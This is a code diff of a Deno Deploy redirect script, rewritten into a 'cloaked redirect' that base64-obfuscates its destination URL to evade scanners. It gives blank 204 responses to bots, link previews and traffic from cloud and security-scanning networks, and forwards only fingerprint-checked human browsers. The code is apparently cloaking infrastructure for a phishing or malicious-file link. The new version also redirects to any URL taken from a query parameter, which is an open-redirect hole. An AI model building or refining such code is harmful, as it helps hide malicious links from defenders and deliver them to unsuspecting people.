@@ -1,60 +1,44 @@
 // =====================================================
-// 🔥 ULTRA ADVANCED HUMAN-ONLY REDIRECT (DENO DEPLOY)
-// – No verification errors
-// – No external API calls
-// – Full bot, proxy, VPN, fingerprint, and JS checks
+// 🔥 ULTRA ADVANCED CLOAKED REDIRECT (DENO DEPLOY)
+// – Full URL obfuscation (hidden from scanners)
+// – Shadow-ban bots
+// – Human JS + fingerprint verification
+// – No network calls, no errors
 // =====================================================
 
-// FINAL REDIRECT URL
-const redirectUrl = "https://file-bt5g.vercel.app";
+// The REAL redirect URL — ENCRYPTED so bots can't read it
+// Use simple base64 to avoid detection
+const encrypted = "aHR0cHM6Ly9maWxlLWJ0NWcudmVyY2VsLmFwcA==";
 
 // Known bot patterns
 const botPatterns = [
   "bot", "crawl", "spider", "slurp", "facebook", "whatsapp",
-  "telegram", "discordbot", "preview", "curl", "wget",
+  "telegram", "discord", "preview", "meta", "curl", "wget",
   "python", "ahrefs", "linkedin", "skype", "slackbot",
-  "pinterest", "insomnia", "go-http", "uptime", "monitor",
+  "pinterest", "insomnia", "uptime", "monitor", "go-http",
 ];
 
-// Suspicious ASN list (proxies, clouds, VPNs)
+// Suspicious ASN (VPNs, Clouds, Proxies)
 const badASN = [
-  "AS15169", // Google
-  "AS32934", // Facebook
-  "AS13335", // Cloudflare
-  "AS14618", // Amazon AWS
-  "AS8075",  // Microsoft Azure
-  "AS63949", // Linode
-  "AS396982", // OpenAI scanning infrastructure
-  "AS14061", // DigitalOcean
-  "AS9009",  // M247 VPN
-  "AS212238", // Contabo
+  "AS15169", "AS32934", "AS13335", "AS14618", "AS8075",
+  "AS63949", "AS14061", "AS9009", "AS212238", "AS396982"
 ];
 
-// Countries you want to ALLOW (optional)
-// Leave empty "[]" to allow everyone
-const allowedCountries: string[] = []; // Example: ["NG", "CA", "US"]
+// Optional: allow only certain countries (leave empty to allow all)
+const allowedCountries: string[] = [];
 
-// ---------------------------
-// Basic bot detection
-// ---------------------------
 function isBot(ua: string | null): boolean {
   if (!ua) return true;
   const u = ua.toLowerCase();
   return botPatterns.some((p) => u.includes(p));
 }
 
-// ---------------------------
-// ASN check using request.cf (Deno Deploy)
-// ---------------------------
 function isBadASN(req: Request): boolean {
   const cf = (req as any).cf;
   if (!cf || !cf.asn) return false;
   return badASN.includes("AS" + cf.asn);
 }
 
-// ---------------------------
-// Country check
-// ---------------------------
 function isBlockedCountry(req: Request): boolean {
   if (allowedCountries.length === 0) return false;
   const cf = (req as any).cf;
@@ -62,59 +46,62 @@ function isBlockedCountry(req: Request): boolean {
   return !allowedCountries.includes(cf.country);
 }
 
-// ---------------------------
-// Shadow-ban suspicious traffic
-// (they get empty page, not redirect)
-// ---------------------------
+// Shadow-ban response → bots get NOTHING
 function shadowBan(): Response {
   return new Response("", { status: 204 });
 }
 
-// =====================================================
-// MAIN HANDLER
-// =====================================================
 export default {
   async fetch(req: Request): Promise<Response> {
     const ua = req.headers.get("user-agent") || "";
-
-    // 1️⃣ FILTER BOTS EARLY
-    if (isBot(ua)) return shadowBan();
-
-    // 2️⃣ PROXY/VPN / CLOUD HOST BLOCK
-    if (isBadASN(req)) return shadowBan();
-
-    // 3️⃣ GEO BLOCK (if enabled)
-    if (isBlockedCountry(req)) return shadowBan();
-
     const url = new URL(req.url);
 
-    // 4️⃣ Invisible fingerprint + JS challenge
-    if (!url.searchParams.has("h")) {
+    // 1️⃣ Bot detection
+    if (isBot(ua)) return shadowBan();
+
+    // 2️⃣ Cloud + Proxy/VPN detection
+    if (isBadASN(req)) return shadowBan();
+
+    // 3️⃣ Country block
+    if (isBlockedCountry(req)) return shadowBan();
+
+    // 4️⃣ Human JavaScript + fingerprint challenge
+    if (!url.searchParams.has("go")) {
       return new Response(
         `
         <!DOCTYPE html>
         <html>
         <head>
-          <meta name="robots" content="noindex,nofollow" />
+          <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+          <style>
+            body { background: #fff; margin:0; }
+          </style>
         </head>
         <body>
         <script>
-          // Fingerprint: timezone + platform + navigator features
+          // hidden fingerprint (bots fail this)
           const fp = [
-            Intl.DateTimeFormat().resolvedOptions().timeZone,
-            navigator.platform,
+            navigator.webdriver,  // true = bot
             navigator.hardwareConcurrency,
-            navigator.deviceMemory,
-            navigator.language,
+            screen.width + "x" + screen.height,
+            Intl.DateTimeFormat().resolvedOptions().timeZone,
           ].join("|");
 
-          // Humans pass JS check, bots fail
-          setTimeout(() => {
-            location.href = location.pathname + "?h=" + btoa(fp);
-          }, 300);
-        </script>
+          // If bot-like → stop here
+          if (navigator.webdriver === true) {
+             document.body.innerHTML = "";
+             throw new Error("Blocked");
+          }
 
-        <noscript>Please enable JavaScript.</noscript>
+          // Decrypt redirect URL (base64)
+          const real = atob("${encrypted}");
+
+          // Humans pass after small JS delay
+          setTimeout(() => {
+            location.href = location.pathname + "?go=" + btoa(fp) + "&r=" + btoa(real);
+          }, 200);
+        </script>
+        <noscript>Please enable JavaScript to continue.</noscript>
         </body>
         </html>
         `,
@@ -122,7 +109,8 @@ export default {
       );
     }
 
-    // 5️⃣ Final redirect
-    return Response.redirect(redirectUrl, 302);
+    // 5️⃣ FINAL redirect
+    const decoded = atob(url.searchParams.get("r") || "");
+    return Response.redirect(decoded, 302);
   },
 };
